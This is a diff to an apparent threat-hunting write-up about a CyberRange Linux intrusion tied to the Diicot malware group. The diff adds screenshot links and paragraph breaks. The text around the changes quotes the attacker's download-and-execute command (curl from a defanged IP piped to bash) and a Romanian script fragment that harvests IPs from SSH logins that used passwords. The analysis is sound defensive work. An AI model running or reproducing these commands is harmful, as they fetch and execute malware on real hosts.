@@ -160,13 +160,22 @@ else
 fi
 ```
 
+![MaliciousDomainScript](https://github.com/user-attachments/assets/27e4c151-a5a2-483a-94a7-78d64614a652)
+
+
 <u>Script Actions</u>
 
 * `curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3`: attempts to fetch a file named black3 from the IP address `196[.]251[.]114[.]67`
 * `curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1`: if the first curl attempt is successful, the script pipes the contents of the black3 file directly to bash, which will execute the commands in the file
 * If the first server is unreachable, it tries to fetch the payload from the second IP address and again pipes it to bash to execute
 
-A quick inspection of the IP address `196[.]251[.]114[.]67` with VirusTotal reveals that the IP address is classified as malicious as well. Another search of the `DeviceNetworkEvents` table for successful connections with the new, malicious IP address returned no results. Suggesting that the threat actor was also unable to connect to the second IP address. At this stage of the investigation, sufficient artifacts and indicators had been collected and verified to conduct OSINT using available public information. Referencing the malicious files, IP addresses, and script code, a relevant threat report from **WIZ** was identified. The threat report focused on an active malware campaign being undergone by the threat group **Diicot** . The reported Diicot payload names, hashes, and indicators closely matched the activity observed within the CyberRange. Revealing several new indicators for further threat hunting.
+A quick inspection of the IP address `196[.]251[.]114[.]67` with VirusTotal reveals that the IP address is classified as malicious as well. 
+
+![image](https://github.com/user-attachments/assets/d886080e-40ac-46fb-8c60-038416a5cb40)
+
+Another search of the `DeviceNetworkEvents` table for successful connections with the new, malicious IP address returned no results. Suggesting that the threat actor was also unable to connect to the second IP address. 
+
+At this stage of the investigation, sufficient artifacts and indicators had been collected and verified to conduct OSINT using available public information. Referencing the malicious files, IP addresses, and script code, a relevant threat report from **WIZ** was identified. The threat report focused on an active malware campaign being undergone by the threat group **Diicot** . The reported Diicot payload names, hashes, and indicators closely matched the activity observed within the CyberRange. Revealing several new indicators for further threat hunting.
 
 *The report: https://www.wiz.io/blog/diicot-threat-group-malware-campaign*
 
@@ -181,11 +190,15 @@ DeviceEvents
 | project Timestamp, AdditionalFields
 ```
 
+![RomanianWordsQuery](https://github.com/user-attachments/assets/a02430da-9bfe-47cf-86fd-ba8bcd71b992)
+
 Romanian in the Script:
 
 ```bash
 #!/bin/bash\n\ninput_file=\"data.json\"\n\ncat \"$input_file\" | grep OpenSSH > .temp\n# Extragem IP-urile care au \"password\" în câmpul userauth\nawk -F '\"' '/\"ip\":/ {ip=$4} /\"userauth\":/ && /password/ {print ip}' .temp > fenta\n
 ```
+
+![RomanianText](https://github.com/user-attachments/assets/7400ee6e-2c5c-4326-a9ad-1b6228108abf)
 
 Translated Script:
 
@@ -205,6 +218,8 @@ DeviceFileEvents
 | where FileName == "Update"
 | project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName, SHA256
 ```
+
+![UpdateFileNotifiedMachine](https://github.com/user-attachments/assets/44715f06-76b9-4b2d-888f-e894fafdfa71)
 
 The log revealed that this file was initiated by the account name `root` in the account domain `sakel-linux-2`. The file’s initiating file process name was `upzbubnv` with the corresponding command line: `./UpzBUBnv`. The hash values of the `Update` file are the following,
 
